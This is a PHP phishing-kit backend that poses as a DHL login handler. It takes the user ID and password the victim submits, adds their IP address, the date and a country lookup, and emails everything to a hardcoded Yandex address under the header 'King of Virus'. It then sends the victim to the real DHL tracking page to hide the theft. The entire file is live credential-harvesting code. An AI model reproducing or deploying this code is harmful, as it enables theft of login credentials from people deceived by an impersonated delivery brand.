<?php
error_reporting(E_ALL);
$country = '';
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($IP)) {
$country = file_get_contents('http://api.hostip.info/country.php?ip='.$IP);
}

date_default_timezone_set("Africa/Lagos");
$log_date = date('d/m/Y - h:i:s');

$message = "";
$message .= "-------------- LoginZ By Asfand Shah-----------------------\n";
$message .= "Ali DHL !ID: ".$_POST['userId']."\n";
$message .= "Password: ".$_POST['password']."\n";

$message .= "IP: ".$ip."\n";
$message .= "Date : ".$log_date."\n";
$message .="Country : ".$country."\n";

$message .= "---------------Created By Asfand Shah------------------------------\n";


$recipient = "chizeechizee655@yandex.com";
$subject = "DHL LOGIN";
$headers = "From:King of Virus<Asfandshah>";
$headers .= $_POST['userId']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);

echo json_encode([
	'location'	=> 'http://www.dhl.com/en/express/tracking.shtml'
]);